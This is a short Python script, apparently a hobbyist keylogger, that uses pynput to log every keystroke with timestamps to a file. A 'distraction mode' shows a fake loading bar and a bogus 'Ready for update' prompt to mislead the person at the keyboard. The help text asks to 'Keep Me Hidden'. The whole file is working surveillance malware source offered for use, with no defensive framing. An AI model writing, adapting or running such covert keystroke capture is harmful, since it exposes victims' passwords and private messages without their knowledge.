from pynput.keyboard import Key, Listener
import logging
import sys
import getopt
import progressbar
import time

def animated_marker():
        
    widgets = ['Loading: ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()
    
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
    x=input('    Ready for update "Y" or "N"    : ')
    print("Fetching ...")
    if(x=="N"):
        print('This application will get closed automatically')

try:
    log_dir = r""
    fn="keyLog.txt"
    if(sys.argv[1]=="-f"):
        if(sys.argv[-1]=="-d"):
            animated_marker()
        temp=sys.argv[2:]
        fn=str(temp[0])
        logging.basicConfig(filename = (log_dir + fn), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def on_press(key):
            logging.info(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()
  
  
    

except :
    print(" Hello, This is a simple key logger \n\n Please Keep Me Hidden   \n !!!!!!!Shhhh!!!!!!!\n  --Bkmaxbaibhav--  \n")
    print(" [ Basic usage python3 Main.py ] \n use -f filename.txt for filename \n")
    print(" -d for distraction mode \n usage : -f filename.txt  -d  \n")

#im good to go :>
